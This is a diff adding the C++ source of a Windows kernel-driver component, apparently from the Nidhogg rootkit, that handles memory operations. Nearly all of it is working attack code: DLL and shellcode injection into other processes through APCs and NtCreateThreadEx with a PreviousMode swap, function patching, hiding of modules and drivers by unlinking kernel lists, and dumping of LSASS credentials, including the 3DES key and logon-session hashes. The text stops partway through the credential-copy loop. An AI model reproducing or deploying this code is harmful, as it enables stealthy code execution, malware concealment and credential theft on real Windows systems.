@@ -1,0 +1,1230 @@
+#include "pch.h"
+#include "MemoryHandler.h"
+
+MemoryHandler::MemoryHandler() {
+	NtCreateThreadEx = NULL;
+	ssdt = NULL;
+
+	cachedLsassInfo.Count = 0;
+	cachedLsassInfo.Creds = NULL;
+	cachedLsassInfo.DesKey.Data = NULL;
+	cachedLsassInfo.Lock.Init();
+
+	if (!InitializeList(&hiddenDrivers))
+		ExRaiseStatus(STATUS_INSUFFICIENT_RESOURCES);
+
+	__try {
+		ssdt = GetSSDTAddress();
+		NtCreateThreadEx = static_cast<tNtCreateThreadEx>(GetSSDTFunctionAddress(ssdt, "NtCreateThreadEx"));
+	}
+	__except (EXCEPTION_EXECUTE_HANDLER) {
+		ExRaiseStatus(GetExceptionCode());
+	}
+}
+
+MemoryHandler::~MemoryHandler() {
+	auto cleaner = [](_In_ HiddenDriverEntry* item) -> void {
+		NidhoggMemoryHandler->UnhideDriver(item->DriverPath);
+	};
+	ClearList<HiddenDriversList, HiddenDriverEntry>(&hiddenDrivers, cleaner);
+
+	AutoLock lsassLock(this->cachedLsassInfo.Lock);
+	FreeVirtualMemory(this->cachedLsassInfo.DesKey.Data);
+
+	if (this->cachedLsassInfo.Creds) {
+		if (this->cachedLsassInfo.Count != 0) {
+			for (ULONG i = 0; i < this->cachedLsassInfo.Count; i++) {
+				if (this->cachedLsassInfo.Creds[i].Username.Length > 0) {
+					FreeUnicodeString(&this->cachedLsassInfo.Creds[i].Username);
+					FreeUnicodeString(&this->cachedLsassInfo.Creds[i].Domain);
+					FreeUnicodeString(&this->cachedLsassInfo.Creds[i].EncryptedHash);
+				}
+			}
+			this->cachedLsassInfo.Count = 0;
+		}
+		FreeVirtualMemory(this->cachedLsassInfo.Creds);
+	}
+}
+
+/*
+* Description:
+* InjectDllAPC is responsible to inject a dll in a certain usermode process with APC.
+*
+* Parameters:
+* @dllInfo [_In_ DllInformation*] -- All the information regarding the injected dll.
+*
+* Returns:
+* @status  [NTSTATUS]			  -- Whether successfuly injected or not.
+*/
+NTSTATUS MemoryHandler::InjectDllAPC(_In_ DllInformation* dllInfo) {
+	ShellcodeInformation shellcodeInfo{};
+	SIZE_T dllPathSize = strlen(dllInfo->DllPath) + 1;
+	NTSTATUS status = STATUS_SUCCESS;
+	PVOID loadLibraryAddress = GetUserModeFuncAddress("LoadLibraryA", L"\\Windows\\System32\\kernel32.dll");
+
+	if (!loadLibraryAddress)
+		return STATUS_ABANDONED;
+
+	// Creating the shellcode information for APC injection.
+	WindowsMemoryAllocator<PVOID> allocator(shellcodeInfo.Parameter1, &dllPathSize, PAGE_READWRITE, &status);
+
+	if (!NT_SUCCESS(status))
+		return status;
+
+	dllPathSize = strlen(dllInfo->DllPath) + 1;
+	status = WriteProcessMemory(dllInfo->DllPath, PsGetCurrentProcess(), shellcodeInfo.Parameter1, strlen(dllInfo->DllPath),
+		KernelMode, false);
+
+	if (!NT_SUCCESS(status))
+		return status;
+
+	shellcodeInfo.Parameter1Size = dllPathSize;
+	shellcodeInfo.Parameter2 = NULL;
+	shellcodeInfo.Parameter3 = NULL;
+	shellcodeInfo.Pid = dllInfo->Pid;
+	shellcodeInfo.Shellcode = loadLibraryAddress;
+	shellcodeInfo.ShellcodeSize = sizeof(PVOID);
+
+	status = InjectShellcodeAPC(&shellcodeInfo, true);
+	return status;
+}
+
+/*
+* Description:
+* InjectDllThread is responsible to inject a dll in a certain usermode process with NtCreateThreadEx.
+*
+* Parameters:
+* @dllInfo [_In_ DllInformation*] -- All the information regarding the injected dll.
+*
+* Returns:
+* @status  [NTSTATUS]			  -- Whether successfuly injected or not.
+*/
+_IRQL_requires_max_(APC_LEVEL)
+NTSTATUS MemoryHandler::InjectDllThread(_In_ DllInformation* dllInfo) {
+	OBJECT_ATTRIBUTES objAttr{};
+	CLIENT_ID cid = { 0 };
+	HANDLE hProcess = NULL;
+	HANDLE hTargetThread = NULL;
+	PEPROCESS targetProcess = NULL;
+	PVOID remoteAddress = NULL;
+	PVOID loadLibraryAddress = nullptr;
+	HANDLE pid = UlongToHandle(dllInfo->Pid);
+	SIZE_T pathLength = strlen(dllInfo->DllPath) + 1;
+	NTSTATUS status = PsLookupProcessByProcessId(pid, &targetProcess);
+
+	if (!NT_SUCCESS(status))
+		return status;
+
+	__try {
+		loadLibraryAddress = GetUserModeFuncAddress("LoadLibraryA", L"\\Windows\\System32\\kernel32.dll", dllInfo->Pid);
+	}
+	__except (EXCEPTION_EXECUTE_HANDLER) {
+		ObDereferenceObject(targetProcess);
+		return GetExceptionCode();
+	}
+
+	InitializeObjectAttributes(&objAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
+	cid.UniqueProcess = pid;
+	cid.UniqueThread = NULL;
+
+	status = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &cid);
+
+	if (!NT_SUCCESS(status)) {
+		ObDereferenceObject(targetProcess);
+		return status;
+	}
+
+	status = ZwAllocateVirtualMemory(hProcess, &remoteAddress, 0, &pathLength, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
+
+	if (!NT_SUCCESS(status)) {
+		ZwClose(hProcess);
+		ObDereferenceObject(targetProcess);
+		return status;
+	}
+
+	pathLength = strlen(dllInfo->DllPath) + 1;
+
+	status = WriteProcessMemory(&(dllInfo->DllPath), targetProcess, remoteAddress, pathLength, KernelMode);
+
+	if (!NT_SUCCESS(status)) {
+		ZwFreeVirtualMemory(hProcess, &remoteAddress, &pathLength, MEM_DECOMMIT);
+		ZwClose(hProcess);
+		ObDereferenceObject(targetProcess);
+		return status;
+	}
+
+	// Making sure that for the creation the thread has access to kernel addresses and restoring the permissions right after.
+	InitializeObjectAttributes(&objAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
+	PCHAR previousMode = reinterpret_cast<PCHAR>(reinterpret_cast<PUCHAR>(PsGetCurrentThread()) + THREAD_PREVIOUSMODE_OFFSET);
+	CHAR tmpPreviousMode = *previousMode;
+	*previousMode = KernelMode;
+	status = this->NtCreateThreadEx(&hTargetThread, THREAD_ALL_ACCESS, &objAttr, hProcess, static_cast<PTHREAD_START_ROUTINE>(loadLibraryAddress),
+		remoteAddress, 0, NULL, NULL, NULL, NULL);
+	*previousMode = tmpPreviousMode;
+
+	if (hTargetThread)
+		ZwClose(hTargetThread);
+
+	if (!NT_SUCCESS(status))
+		ZwFreeVirtualMemory(hProcess, &remoteAddress, &pathLength, MEM_DECOMMIT);
+
+	ZwClose(hProcess);
+	ObDereferenceObject(targetProcess);
+	return status;
+}
+
+/*
+* Description:
+* InjectShellcodeAPC is responsible to inject a shellcode in a certain usermode process.
+*
+* Parameters:
+* @ShellcodeInfo [_In_ ShellcodeInformation*] -- All the information regarding the injected shellcode.
+* @isInjectedDll [_In_ bool]				  -- Whether the shellcode is injected from InjectDllAPC or not.
+*
+* Returns:
+* @status		 [NTSTATUS]					  -- Whether successfuly injected or not.
+*/
+_IRQL_requires_max_(APC_LEVEL)
+NTSTATUS MemoryHandler::InjectShellcodeAPC(_In_ ShellcodeInformation* shellcodeInformation, _In_ bool isInjectedDll) {
+	OBJECT_ATTRIBUTES objAttr{};
+	CLIENT_ID cid = { 0 };
+	HANDLE hProcess = NULL;
+	PEPROCESS targetProcess = NULL;
+	PETHREAD targetThread = NULL;
+	PKAPC shellcodeApc = NULL;
+	PKAPC prepareApc = NULL;
+	PVOID remoteAddress = NULL;
+	NTSTATUS status = STATUS_SUCCESS;
+	PVOID remoteData = NULL;
+	SIZE_T dataSize = isInjectedDll ? shellcodeInformation->Parameter1Size : shellcodeInformation->ShellcodeSize;
+
+	if (!shellcodeInformation->Shellcode || dataSize == 0)
+		return STATUS_INVALID_PARAMETER;
+	HANDLE pid = UlongToHandle(shellcodeInformation->Pid);
+	status = PsLookupProcessByProcessId(pid, &targetProcess);
+
+	if (!NT_SUCCESS(status))
+		return status;
+
+	// Find APC suitable thread.
+	__try {
+		targetThread = FindAlertableThread(pid);
+	}
+	__except (EXCEPTION_EXECUTE_HANDLER) {
+		ObDereferenceObject(targetProcess);
+		return GetExceptionCode();
+	}
+
+	do {
+		if (!NT_SUCCESS(status) || !targetThread) {
+			if (NT_SUCCESS(status))
+				status = STATUS_NOT_FOUND;
+			break;
+		}
+
+		// Allocate and write the shellcode.
+		InitializeObjectAttributes(&objAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
+		cid.UniqueProcess = pid;
+		cid.UniqueThread = NULL;
+
+		status = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &cid);
+
+		if (!NT_SUCCESS(status))
+			break;
+
+		status = ZwAllocateVirtualMemory(hProcess, &remoteAddress, 0, &dataSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
+
+		if (!NT_SUCCESS(status))
+			break;
+
+		dataSize = isInjectedDll ? shellcodeInformation->Parameter1Size : shellcodeInformation->ShellcodeSize;
+		remoteData = isInjectedDll ? shellcodeInformation->Parameter1 : shellcodeInformation->Shellcode;
+		status = WriteProcessMemory(remoteData, targetProcess, remoteAddress, dataSize, UserMode);
+
+		if (!NT_SUCCESS(status))
+			break;
+
+		// Create and execute the APCs.
+		shellcodeApc = AllocateMemory<PKAPC>(sizeof(KAPC), false);
+		prepareApc = AllocateMemory<PKAPC>(sizeof(KAPC), false);
+
+		if (!shellcodeApc || !prepareApc) {
+			status = STATUS_INSUFFICIENT_RESOURCES;
+			break;
+		}
+		KeInitializeApc(prepareApc, targetThread, OriginalApcEnvironment, static_cast<PKKERNEL_ROUTINE>(&PrepareApcCallback), NULL, NULL, KernelMode, NULL);
+
+		if (isInjectedDll)
+			KeInitializeApc(shellcodeApc, targetThread, OriginalApcEnvironment, static_cast<PKKERNEL_ROUTINE>(&ApcInjectionCallback), NULL, static_cast<PKNORMAL_ROUTINE>(shellcodeInformation->Shellcode), UserMode, remoteAddress);
+		else
+			KeInitializeApc(shellcodeApc, targetThread, OriginalApcEnvironment, static_cast<PKKERNEL_ROUTINE>(&ApcInjectionCallback), NULL, static_cast<PKNORMAL_ROUTINE>(remoteAddress), UserMode, shellcodeInformation->Parameter1);
+
+		if (!KeInsertQueueApc(shellcodeApc, shellcodeInformation->Parameter2, shellcodeInformation->Parameter3, FALSE)) {
+			status = STATUS_UNSUCCESSFUL;
+			break;
+		}
+
+		if (!KeInsertQueueApc(prepareApc, NULL, NULL, FALSE)) {
+			status = STATUS_UNSUCCESSFUL;
+			break;
+		}
+
+		if (PsIsThreadTerminating(targetThread))
+			status = STATUS_THREAD_IS_TERMINATING;
+
+	} while (false);
+
+
+	if (!NT_SUCCESS(status)) {
+		if (remoteAddress)
+			ZwFreeVirtualMemory(hProcess, &remoteAddress, &dataSize, MEM_DECOMMIT);
+		FreeVirtualMemory(prepareApc);
+		FreeVirtualMemory(shellcodeApc);
+	}
+
+	if (targetThread)
+		ObDereferenceObject(targetThread);
+
+	if (targetProcess)
+		ObDereferenceObject(targetProcess);
+
+	if (hProcess)
+		ZwClose(hProcess);
+
+	return status;
+}
+
+/*
+* Description:
+* InjectShellcodeThread is responsible to inject a shellcode in a certain usermode process with NtCreateThreadEx.
+*
+* Parameters:
+* @ShellcodeInfo [_In_ ShellcodeInformation*] -- All the information regarding the injected shellcode.
+*
+* Returns:
+* @status		 [NTSTATUS]					  -- Whether successfuly injected or not.
+*/
+_IRQL_requires_max_(APC_LEVEL)
+NTSTATUS MemoryHandler::InjectShellcodeThread(_In_ ShellcodeInformation* shellcodeInfo) {
+	OBJECT_ATTRIBUTES objAttr{};
+	CLIENT_ID cid = { 0 };
+	HANDLE hProcess = NULL;
+	HANDLE hTargetThread = NULL;
+	PEPROCESS TargetProcess = NULL;
+	PVOID remoteAddress = NULL;
+	SIZE_T shellcodeSize = shellcodeInfo->ShellcodeSize;
+	HANDLE pid = UlongToHandle(shellcodeInfo->Pid);
+	NTSTATUS status = PsLookupProcessByProcessId(pid, &TargetProcess);
+
+	if (!NT_SUCCESS(status))
+		return status;
+
+	InitializeObjectAttributes(&objAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
+	cid.UniqueProcess = pid;
+	cid.UniqueThread = NULL;
+	status = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &cid);
+
+	do {
+		if (!NT_SUCCESS(status))
+			break;
+		status = ZwAllocateVirtualMemory(hProcess, &remoteAddress, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
+
+		if (!NT_SUCCESS(status))
+			break;
+		shellcodeSize = shellcodeInfo->ShellcodeSize;
+		status = WriteProcessMemory(shellcodeInfo->Shellcode, TargetProcess, remoteAddress, shellcodeSize, UserMode);
+
+		if (!NT_SUCCESS(status))
+			break;
+
+		// Making sure that for the creation the thread has access to kernel addresses and restoring the permissions right after.
+		InitializeObjectAttributes(&objAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
+		PCHAR previousMode = reinterpret_cast<PCHAR>(reinterpret_cast<PUCHAR>(PsGetCurrentThread()) + THREAD_PREVIOUSMODE_OFFSET);
+		CHAR tmpPreviousMode = *previousMode;
+		*previousMode = KernelMode;
+		status = this->NtCreateThreadEx(&hTargetThread, THREAD_ALL_ACCESS, &objAttr, hProcess, 
+			static_cast<PTHREAD_START_ROUTINE>(remoteAddress), NULL, 0, NULL, NULL, NULL, NULL);
+		*previousMode = tmpPreviousMode;
+
+	} while (false);
+
+	if (hTargetThread)
+		ZwClose(hTargetThread);
+
+	if (!NT_SUCCESS(status) && remoteAddress)
+		ZwFreeVirtualMemory(hProcess, &remoteAddress, &shellcodeSize, MEM_DECOMMIT);
+
+	if (hProcess)
+		ZwClose(hProcess);
+
+	if (TargetProcess)
+		ObDereferenceObject(TargetProcess);
+
+	return status;
+}
+
+/*
+* Description:
+* PatchModule is responsible for patching a certain moudle in a certain process.
+*
+* Parameters:
+* @ModuleInformation [_In_ PatchedModule*] -- All the information regarding the module that needs to be patched.
+*
+* Returns:
+* @status			 [NTSTATUS]			   -- Whether successfuly patched or not.
+*/
+_IRQL_requires_max_(APC_LEVEL)
+NTSTATUS MemoryHandler::PatchModule(_In_ PatchedModule* moduleInformation) {
+	PEPROCESS targetProcess = nullptr;
+	PVOID functionAddress = NULL;
+	PVOID moduleImageBase = NULL;
+	WCHAR* moduleName = NULL;
+	CHAR* functionName = NULL;
+	NTSTATUS status = STATUS_UNSUCCESSFUL;
+
+	// Copying the values to local variables before they are unaccesible because of KeStackAttachProcess.
+	SIZE_T moduleNameSize = (wcslen(moduleInformation->ModuleName) + 1) * sizeof(WCHAR);
+	MemoryAllocator<WCHAR*> moduleNameAllocator(&moduleName, moduleNameSize);
+	status = moduleNameAllocator.CopyData(moduleInformation->ModuleName, moduleNameSize);
+
+	if (!NT_SUCCESS(status))
+		return status;
+
+	SIZE_T functionNameSize = (wcslen(moduleInformation->ModuleName) + 1) * sizeof(WCHAR);
+	MemoryAllocator<CHAR*> functionNameAllocator(&functionName, functionNameSize);
+	status = functionNameAllocator.CopyData(moduleInformation->FunctionName, functionNameSize);
+
+	if (!NT_SUCCESS(status))
+		return status;
+
+	status = PsLookupProcessByProcessId(ULongToHandle(moduleInformation->Pid), &targetProcess);
+
+	if (!NT_SUCCESS(status))
+		return status;
+
+	// Getting the PEB.
+	__try {
+		functionAddress = GetUserModeFuncAddress(functionName, moduleInformation->ModuleName, moduleInformation->Pid);
+	}
+	__except (EXCEPTION_EXECUTE_HANDLER) {
+		ObDereferenceObject(targetProcess);
+		return GetExceptionCode();
+	}
+	status = WriteProcessMemory(moduleInformation->Patch, targetProcess, functionAddress, moduleInformation->PatchLength, KernelMode);
+	ObDereferenceObject(targetProcess);
+	return status;
+}
+
+/*
+* Description:
+* HideModule is responsible for hiding user mode module that is loaded in a process.
+*
+* Parameters:
+* @moduleInformation [_In_ HiddenModuleInformation*] -- Required information, contains PID and module's name.
+*
+* Returns:
+* @status			 [NTSTATUS]						 -- Whether successfuly hidden or not.
+*/
+_IRQL_requires_max_(APC_LEVEL)
+NTSTATUS MemoryHandler::HideModule(_In_ HiddenModuleInformation* moduleInformation) {
+	PLDR_DATA_TABLE_ENTRY pebEntry;
+	KAPC_STATE state;
+	NTSTATUS status = STATUS_SUCCESS;
+	PEPROCESS targetProcess = NULL;
+	LARGE_INTEGER time = { 0 };
+	PVOID moduleBase = NULL;
+	WCHAR* moduleName = NULL;
+	time.QuadPart = ONE_SECOND;
+
+	SIZE_T moduleNameSize = (wcslen(moduleInformation->ModuleName) + 1) * sizeof(WCHAR);
+	MemoryAllocator<WCHAR*> moduleNameAllocator(&moduleName, moduleNameSize);
+	status = moduleNameAllocator.CopyData(moduleInformation->ModuleName, moduleNameSize);
+
+	if (!NT_SUCCESS(status))
+		return status;
+
+	// Getting the process's PEB.
+	status = PsLookupProcessByProcessId(ULongToHandle(moduleInformation->Pid), &targetProcess);
+
+	if (!NT_SUCCESS(status))
+		return status;
+
+	KeStackAttachProcess(targetProcess, &state);
+	PREALPEB targetPeb = reinterpret_cast<PREALPEB>(PsGetProcessPeb(targetProcess));
+
+	if (!targetPeb) {
+		KeUnstackDetachProcess(&state);
+		ObDereferenceObject(targetProcess);
+		return STATUS_ABANDONED;
+	}
+
+	for (UINT16 i = 0; !targetPeb->LoaderData && i < 10; i++) {
+		KeDelayExecutionThread(KernelMode, FALSE, &time);
+	}
+
+	if (!targetPeb->LoaderData) {
+		KeUnstackDetachProcess(&state);
+		ObDereferenceObject(targetProcess);
+		return STATUS_ABANDONED_WAIT_0;
+	}
+
+	if (!&targetPeb->LoaderData->InLoadOrderModuleList) {
+		KeUnstackDetachProcess(&state);
+		ObDereferenceObject(targetProcess);
+		return STATUS_ABANDONED_WAIT_0;
+	}
+
+	// Finding the module inside the process.
+	status = STATUS_NOT_FOUND;
+
+	for (PLIST_ENTRY pListEntry = targetPeb->LoaderData->InLoadOrderModuleList.Flink;
+		pListEntry != &targetPeb->LoaderData->InLoadOrderModuleList;
+		pListEntry = pListEntry->Flink) {
+
+		pebEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
+
+		if (pebEntry) {
+			if (pebEntry->FullDllName.Length > 0) {
+				if (_wcsnicmp(pebEntry->FullDllName.Buffer, moduleName, pebEntry->FullDllName.Length / sizeof(wchar_t) - 4) == 0) {
+					moduleBase = pebEntry->DllBase;
+					RemoveEntryList(&pebEntry->InLoadOrderLinks);
+					RemoveEntryList(&pebEntry->InInitializationOrderLinks);
+					RemoveEntryList(&pebEntry->InMemoryOrderLinks);
+					RemoveEntryList(&pebEntry->HashLinks);
+					status = STATUS_SUCCESS;
+					break;
+				}
+			}
+		}
+	}
+	KeUnstackDetachProcess(&state);
+
+	if (NT_SUCCESS(status))
+		status = VadHideObject(targetProcess, reinterpret_cast<ULONG_PTR>(moduleBase));
+
+	ObDereferenceObject(targetProcess);
+	return status;
+}
+
+/*
+* Description:
+* HideDriver is responsible for hiding a kernel driver.
+*
+* Parameters:
+* @driverPath [wchar_t*] -- Required information, contains the driver's information.
+*
+* Returns:
+* @status	  [NTSTATUS] -- Whether successfuly hidden or not.
+*/
+_IRQL_requires_max_(APC_LEVEL)
+NTSTATUS MemoryHandler::HideDriver(_In_ wchar_t* driverPath) {
+	HiddenDriverEntry hiddenDriver = { 0 };
+	PKLDR_DATA_TABLE_ENTRY loadedModulesEntry = NULL;
+	NTSTATUS status = STATUS_NOT_FOUND;
+
+	if (!ExAcquireResourceExclusiveLite(PsLoadedModuleResource, 1))
+		return STATUS_ABANDONED;
+
+	for (PLIST_ENTRY pListEntry = PsLoadedModuleList->InLoadOrderLinks.Flink;
+		pListEntry != &PsLoadedModuleList->InLoadOrderLinks;
+		pListEntry = pListEntry->Flink) {
+
+		loadedModulesEntry = CONTAINING_RECORD(pListEntry, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
+
+		if (_wcsnicmp(loadedModulesEntry->FullDllName.Buffer, driverPath,
+			loadedModulesEntry->FullDllName.Length / sizeof(wchar_t) - 4) == 0) {
+
+			// Copying the original entry to make sure it can be restored again.
+			hiddenDriver.DriverPath = AllocateMemory<wchar_t*>((loadedModulesEntry->FullDllName.Length + sizeof(wchar_t)) * sizeof(wchar_t));
+
+			if (!hiddenDriver.DriverPath) {
+				status = STATUS_INSUFFICIENT_RESOURCES;
+				break;
+			}
+			errno_t err = wcscpy_s(hiddenDriver.DriverPath, (loadedModulesEntry->FullDllName.Length + sizeof(wchar_t)) * sizeof(wchar_t), 
+				loadedModulesEntry->FullDllName.Buffer);
+
+			if (err != 0) {
+				FreeVirtualMemory(hiddenDriver.DriverPath);
+				status = STATUS_UNSUCCESSFUL;
+				break;
+			}
+			hiddenDriver.originalEntry = loadedModulesEntry;
+
+			if (!AddHiddenDriver(hiddenDriver)) {
+				FreeVirtualMemory(hiddenDriver.DriverPath);
+				status = STATUS_UNSUCCESSFUL;
+				break;
+			}
+
+			RemoveEntryList(&loadedModulesEntry->InLoadOrderLinks);
+			status = STATUS_SUCCESS;
+			break;
+		}
+	}
+
+	ExReleaseResourceLite(PsLoadedModuleResource);
+	return status;
+}
+
+/*
+* Description:
+* UnhideDriver is responsible for restoring a kernel driver.
+*
+* Parameters:
+* @driverPath [_In_ wchar_t*] -- Required information, contains the driver's information.
+*
+* Returns:
+* @status	  [NTSTATUS]	  -- Whether successfuly unhidden or not.
+*/
+_IRQL_requires_max_(APC_LEVEL)
+NTSTATUS MemoryHandler::UnhideDriver(_In_ wchar_t* driverPath) {
+	PKLDR_DATA_TABLE_ENTRY loadedModulesEntry = NULL;
+	NTSTATUS status = STATUS_SUCCESS;
+	HiddenDriverEntry* driverEntry = nullptr;
+
+	if (!FindHiddenDriver(driverPath, driverEntry))
+		return STATUS_NOT_FOUND;
+
+	if (!ExAcquireResourceExclusiveLite(PsLoadedModuleResource, 1))
+		return STATUS_ABANDONED;
+
+	PLIST_ENTRY pListEntry = PsLoadedModuleList->InLoadOrderLinks.Flink;
+	loadedModulesEntry = CONTAINING_RECORD(pListEntry, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
+	InsertTailList(&loadedModulesEntry->InLoadOrderLinks, reinterpret_cast<PLIST_ENTRY>(driverEntry->originalEntry));
+
+	if (RemoveListEntry(&hiddenDrivers, driverEntry))
+		status = STATUS_UNSUCCESSFUL;
+
+	ExReleaseResourceLite(PsLoadedModuleResource);
+	return status;
+}
+
+/*
+* Description:
+* DumpCredentials is responsible for dumping credentials from lsass.
+*
+* Parameters:
+* allocationSize [_Out_ SIZE_T*] -- Size to allocate for credentials buffer.
+*
+* Returns:
+* @status		 [NTSTATUS]		 -- Whether successfuly dumped or not.
+*/
+_IRQL_requires_max_(APC_LEVEL)
+NTSTATUS MemoryHandler::DumpCredentials(_Out_ SIZE_T* allocationSize) {
+	KAPC_STATE state;
+	ULONG lsassPid = 0;
+	ULONG foundIndex = 0;
+	SIZE_T bytesWritten = 0;
+	PEPROCESS lsass = NULL;
+	ULONG credentialsIndex = 0;
+	ULONG validCredentialsCount = 0;
+	ULONG credentialsCount = 0;
+	PVOID lsasrvMain = nullptr;
+	PLSASRV_CREDENTIALS currentCredentials = NULL;
+
+	if (!allocationSize)
+		return STATUS_INVALID_PARAMETER;
+
+	if (this->cachedLsassInfo.Count != 0)
+		return STATUS_ABANDONED;
+
+	__try {
+		lsassPid = FindPidByName(L"lsass.exe");
+	}
+	__except (EXCEPTION_EXECUTE_HANDLER) {
+		return GetExceptionCode();
+	}
+
+	NTSTATUS status = PsLookupProcessByProcessId(ULongToHandle(lsassPid), &lsass);
+
+	if (!NT_SUCCESS(status))
+		return status;
+
+	__try {
+		lsasrvMain = GetUserModeFuncAddress("LsaIAuditSamEvent", L"\\Windows\\System32\\lsasrv.dll", lsassPid);
+	}
+	__except (EXCEPTION_EXECUTE_HANDLER) {
+		ObDereferenceObject(lsass);
+		return GetExceptionCode();
+	}
+
+	KeStackAttachProcess(lsass, &state);
+	do {
+		// Finding LsaEnumerateLogonSession and LsaInitializeProtectedMemory to extract the LogonSessionList and the 3DES key.
+		PVOID lsaEnumerateLogonSessionLocation = FindPattern(const_cast<PUCHAR>(LogonSessionListLocation), 0xCC,
+			sizeof(LogonSessionListLocation), lsasrvMain,
+			LogonSessionListLocationDistance, NULL, 0);
+
+		if (!lsaEnumerateLogonSessionLocation) {
+			lsaEnumerateLogonSessionLocation = FindPattern(const_cast<PUCHAR>(LogonSessionListLocation), 0xCC,
+				sizeof(LogonSessionListLocation), lsasrvMain,
+				LogonSessionListLocationDistance, NULL, 0, true);
+
+			if (!lsaEnumerateLogonSessionLocation) {
+				status = STATUS_NOT_FOUND;
+				break;
+			}
+		}
+
+		PVOID lsaInitializeProtectedMemory = FindPattern(const_cast<PUCHAR>(IvDesKeyLocation), 0xCC,
+			sizeof(IvDesKeyLocation), lsasrvMain,
+			IvDesKeyLocationDistance, NULL, 0);
+
+		if (!lsaInitializeProtectedMemory) {
+			lsaInitializeProtectedMemory = FindPattern(const_cast<PUCHAR>(IvDesKeyLocation), 0xCC,
+				sizeof(IvDesKeyLocation), lsasrvMain,
+				IvDesKeyLocationDistance, NULL, 0, true);
+
+			if (!lsaInitializeProtectedMemory) {
+				status = STATUS_NOT_FOUND;
+				break;
+			}
+		}
+
+		PVOID lsaEnumerateLogonSessionStart = FindPattern(const_cast<PUCHAR>(FunctionStartSignature), 0xCC,
+			sizeof(FunctionStartSignature), lsaEnumerateLogonSessionLocation,
+			WLsaEnumerateLogonSessionLen, NULL, 0, true);
+
+		if (!lsaEnumerateLogonSessionStart) {
+			status = STATUS_NOT_FOUND;
+			break;
+		}
+
+		// Getting 3DES key
+		PULONG desKeyAddressOffset = static_cast<PULONG>(FindPattern(const_cast<PUCHAR>(DesKeySignature), 0xCC,
+			sizeof(DesKeySignature), lsaInitializeProtectedMemory, LsaInitializeProtectedMemoryLen,
+			&foundIndex, DesKeyOffset));
+
+		if (!desKeyAddressOffset) {
+			status = STATUS_NOT_FOUND;
+			break;
+		}
+		PBCRYPT_GEN_KEY desKey = reinterpret_cast<PBCRYPT_GEN_KEY>(static_cast<PUCHAR>(lsaInitializeProtectedMemory) + 
+			(*desKeyAddressOffset) + foundIndex + DesKeyStructOffset);
+		status = ProbeAddress(desKey, sizeof(BCRYPT_GEN_KEY), sizeof(BCRYPT_GEN_KEY), STATUS_NOT_FOUND);
+
+		if (!NT_SUCCESS(status))
+			break;
+
+		if (desKey->hKey->tag != DES_KEY_TAG1 || desKey->hKey->key->tag != DES_KEY_TAG2) {
+			status = STATUS_NOT_FOUND;
+			break;
+		}
+
+		this->cachedLsassInfo.DesKey.Size = desKey->hKey->key->hardkey.cbSecret;
+		this->cachedLsassInfo.DesKey.Data = AllocateMemory<PVOID>(this->cachedLsassInfo.DesKey.Size);
+
+		if (!cachedLsassInfo.DesKey.Data) {
+			status = STATUS_INSUFFICIENT_RESOURCES;
+			break;
+		}
+		status = MmCopyVirtualMemory(lsass, desKey->hKey->key->hardkey.data, IoGetCurrentProcess(),
+			this->cachedLsassInfo.DesKey.Data, this->cachedLsassInfo.DesKey.Size, KernelMode, &bytesWritten);
+
+		if (!NT_SUCCESS(status))
+			break;
+
+		// Getting LogonSessionList
+		PULONG logonSessionListAddressOffset = static_cast<PULONG>(FindPattern(const_cast<PUCHAR>(LogonSessionListSignature), 0xCC,
+			sizeof(LogonSessionListSignature), lsaEnumerateLogonSessionStart, WLsaEnumerateLogonSessionLen,
+			&foundIndex, LogonSessionListOffset));
+
+		if (!logonSessionListAddressOffset) {
+			status = STATUS_NOT_FOUND;
+			break;
+		}
+
+		PLIST_ENTRY logonSessionListAddress = reinterpret_cast<PLIST_ENTRY>(static_cast<PUCHAR>(lsaEnumerateLogonSessionStart) + 
+			(*logonSessionListAddressOffset) + foundIndex);
+
+		logonSessionListAddress = reinterpret_cast<PLIST_ENTRY>(AlignAddress(reinterpret_cast<ULONGLONG>(logonSessionListAddress)));
+
+		status = ProbeAddress(logonSessionListAddress, sizeof(PLSASRV_CREDENTIALS), sizeof(PLSASRV_CREDENTIALS), STATUS_NOT_FOUND);
+
+		if (!NT_SUCCESS(status))
+			break;
+
+		currentCredentials = reinterpret_cast<PLSASRV_CREDENTIALS>(logonSessionListAddress->Flink);
+
+		// Getting the real amount of credentials.
+		while (reinterpret_cast<PLIST_ENTRY>(currentCredentials) != logonSessionListAddress) {			
+			credentialsCount++;
+			currentCredentials = currentCredentials->Flink;
+		}
+
+		if (credentialsCount == 0) {
+			status = STATUS_NOT_FOUND;
+			break;
+		}
+		this->cachedLsassInfo.Creds = AllocateMemory<Credentials*>(credentialsCount * sizeof(Credentials));
+
+		if (!this->cachedLsassInfo.Creds) {
+			status = STATUS_INSUFFICIENT_RESOURCES;
+			break;
+		}
+		currentCredentials = reinterpret_cast<PLSASRV_CREDENTIALS>(logonSessionListAddress->Flink);
+
+		// Getting the interesting information.
+		for (credentialsIndex = 0; credentialsIndex < credentialsCount && reinterpret_cast<PLIST_ENTRY>(currentCredentials) != logonSessionListAddress;
+			credentialsIndex++, currentCredentials = currentCredentials->Flink) {
+
+			if (currentCredentials->UserName.Length == 0 || !currentCredentials->Credentials)
+				continue;
+
+			if (!currentCredentials->Credentials->PrimaryCredentials)
+				continue;
+
+			if (currentCredentials->Credentials->PrimaryCredentials->Credentials.Length == 0)
+				continue;
+
+			this->cachedLsassInfo.Creds[credentialsIndex].Username.Buffer = NULL;
+			status = CopyUnicodeString(lsass, &currentCredentials->UserName, IoGetCurrentProcess(),
+				&this->cachedLsassInfo.Creds[credentialsIndex].Username, KernelMode);
+			
+			if (!NT_SUCCESS(status))
+				break;
+
